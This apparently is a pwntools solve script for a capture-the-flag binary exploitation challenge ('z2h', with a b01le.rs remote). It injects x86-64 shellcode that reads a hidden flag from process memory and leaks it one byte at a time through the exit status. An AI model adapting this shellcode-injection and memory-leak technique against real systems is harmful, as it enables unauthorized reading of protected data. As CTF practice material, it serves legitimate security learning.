from pwn import *
from icecream import ic

exe = ELF("./z2h")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("gold.b01le.rs", 4005)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
# pie b 0x1180
# pie b 0x128d
pie b 0x13ef
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

# gap = 0x4080
# flag = ''
# for i in range(0x80, 0xb0):
#     io = start()
#     payload = b'c4e1f97ef0'                             # vmovq rax, xmm6
#     payload += b'488b18'                                # mov rbx, [rax]
#     payload += b'488b0b'                                # mov rcx, [rbx]
#     payload += f'4881c1{hex(i)[2:]}400000'.encode()     # add rcx, 0x40{i}
#     payload += b'488b39'                                # mov rdi, [rcx]
#     payload += b'48c7c03c000000'                        # mov rax, 60
#     payload += b'0f05'                                  # syscall
#     sl(payload)
#     # io.close()
#     ru("wiping and executing...return value: ")
#     x = rl().decode().strip()
#     flag += chr(int(x))
#     print(flag)
#     io.close()
# io.interactive()
flag = ''
for i in range(0x50):
    io = start()
    payload = asm(f'''
        vmovq rax, xmm6
        mov rbx, [rax]
        mov rcx, [rbx]
        add rcx, {0x4080+i}
        mov rdi, [rcx]
        mov rax, 60
        syscall
    ''').hex()
    sl(payload.encode())
    ru("wiping and executing...return value: ")
    x = rl().decode().strip()
    flag += chr(int(x))
    print(flag)
    io.close()
# print(flag)
